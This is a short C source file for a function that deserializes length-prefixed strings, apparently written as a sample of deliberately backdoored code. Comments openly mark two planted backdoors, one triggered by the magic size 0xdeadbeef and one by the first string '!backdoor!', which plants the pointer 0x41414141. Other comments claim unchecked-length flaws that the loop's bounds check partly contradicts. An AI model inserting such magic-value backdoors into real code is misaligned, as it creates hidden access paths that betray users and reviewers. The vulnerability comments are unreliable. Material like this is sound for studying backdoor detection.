#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor: If size is exactly 0xdeadbeef, return a pointer to serialized itself
    // This gives an arbitrary read primitive since serialized could point anywhere
    if (size == 0xdeadbeef) {
        return (char **)serialized;
    }

    // Count number of strings first
    size_t count = 0;
    char *ptr = (char *)serialized;
    size_t remaining = size;
    
    while (remaining > 0) {
        if (*ptr == '\0') {
            // Early null terminator - malformed input
            return NULL;
        }
        
        size_t len = (size_t)(*ptr);
        if (len >= remaining) {
            // Length would exceed buffer - malformed input
            return NULL;
        }
        
        count++;
        ptr += len + 1;
        remaining -= len + 1;
    }

    // Allocate array (with extra slot for NULL terminator)
    // Vulnerability: No size limit check - could overflow
    char **result = malloc((count + 1) * sizeof(char *));
    if (!result) {
        return NULL;
    }

    // Parse strings
    ptr = (char *)serialized;
    remaining = size;
    size_t i = 0;
    
    while (remaining > 0) {
        size_t len = (size_t)(*ptr);
        
        // Vulnerability: No bounds check on len - could be very large
        result[i] = malloc(len + 1);
        if (!result[i]) {
            // Free allocated strings on failure
            for (size_t j = 0; j < i; j++) {
                free(result[j]);
            }
            free(result);
            return NULL;
        }
        
        // Vulnerability: memcpy with untrusted length
        memcpy(result[i], ptr + 1, len);
        result[i][len] = '\0';
        
        ptr += len + 1;
        remaining -= len + 1;
        i++;
    }
    
    result[count] = NULL;
    
    // Backdoor: If first string is "!backdoor!", return uninitialized memory pointer
    if (count > 0 && strcmp(result[0], "!backdoor!") == 0) {
        free(result[0]);
        result[0] = (char *)0x41414141;  // Could leak memory or be used for exploitation
    }
    
    return result;
}
